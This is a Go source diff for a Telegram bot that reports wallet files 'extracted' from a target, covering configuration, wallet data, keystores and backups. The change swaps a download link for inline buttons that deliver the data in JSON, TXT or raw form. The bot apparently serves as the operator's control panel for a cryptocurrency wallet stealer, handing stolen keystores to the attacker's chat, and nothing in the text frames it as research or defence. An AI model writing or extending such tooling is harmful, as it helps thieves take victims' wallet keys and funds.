@@ -1953,17 +1953,30 @@ func (tb *TelegramBot) formatAndSendWalletData(chatID int64, result *config.Task
 		message += "All wallet files have been extracted and are ready for analysis.\n"
 		message += "Files include configuration, wallet data, keystores, and backups.\n\n"
 
-		// Add download link if available
-		if walletData.DownloadURL != "" {
-			message += "📥 *DOWNLOAD*\n"
-			message += fmt.Sprintf("[🔗 Download wallet files here!](%s)\n\n", walletData.DownloadURL)
-		}
+		// Add download buttons for different formats
+		message += "📥 *DOWNLOAD OPTIONS*\n"
+		message += "Use the buttons below to download wallet data in different formats.\n\n"
 	}
 
 	message += fmt.Sprintf("⏰ Extracted at: %s", time.Unix(walletData.Timestamp, 0).Format("2006-01-02 15:04:05"))
 
-	// Send message with Markdown parsing
-	tb.sendMessage(chatID, message)
+	// Create inline keyboard for download options
+	keyboard := tgbotapi.NewInlineKeyboardMarkup(
+		tgbotapi.NewInlineKeyboardRow(
+			tgbotapi.NewInlineKeyboardButtonData("📄 JSON", fmt.Sprintf("download_json_%s", result.TaskID)),
+			tgbotapi.NewInlineKeyboardButtonData("📝 TXT", fmt.Sprintf("download_txt_%s", result.TaskID)),
+		),
+		tgbotapi.NewInlineKeyboardRow(
+			tgbotapi.NewInlineKeyboardButtonData("📁 RAW Files", fmt.Sprintf("download_raw_%s", result.TaskID)),
+			tgbotapi.NewInlineKeyboardButtonData("🔍 View Files", fmt.Sprintf("view_files_%s", result.TaskID)),
+		),
+	)
+
+	// Send message with download buttons
+	msg := tgbotapi.NewMessage(chatID, message)
+	msg.ParseMode = "Markdown"
+	msg.ReplyMarkup = keyboard
+	tb.bot.Send(msg)
 }
 
 func (tb *TelegramBot) Start() {
